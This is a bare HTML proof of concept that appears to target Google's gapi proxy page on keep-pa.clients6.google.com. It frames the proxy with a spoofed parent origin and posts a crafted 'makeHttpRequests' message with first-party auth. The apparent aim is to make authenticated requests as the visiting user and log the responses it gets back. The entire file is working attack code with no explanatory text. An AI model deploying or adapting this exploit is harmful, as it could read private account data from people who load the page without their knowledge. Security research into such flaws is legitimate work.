<html>
<iframe id="iframe" src="https://keep-pa.clients6.google.com/static/proxy.html?usegapi=1&parent=https://sites.google.com/"></iframe>

<script type="text/javascript">
    window.addEventListener("message", function (e) { 
        // Ensure message comes from expected origin
        if (e.origin !== "https://keep-pa.clients6.google.com") return;

        console.log("Received message:", e.data);
    });

    document.getElementById("iframe").addEventListener("load", function () {
        var iframe = document.getElementById("iframe");
        iframe.contentWindow.postMessage(
            JSON.stringify({
                "s": "makeHttpRequests",
                "f": "..",
                "c": 1,
                "a": [[
                    {
                        "key": "gapiRequest",
                        "params": {
                            "url": "/",
                            "path": "/",
                            "httpMethod": "GET",
                            "headers": {},
                            "urlParams": {},
                            "root": "keep-pa.clients6.google.com",
                            "authType": "1p"
                        }
                    }
                ]],
                "l": false,
                "g": true,
                "t": "",
                "r": ".."
            }),
            "https://keep-pa.clients6.google.com"
        );
    });
</script>
</html>
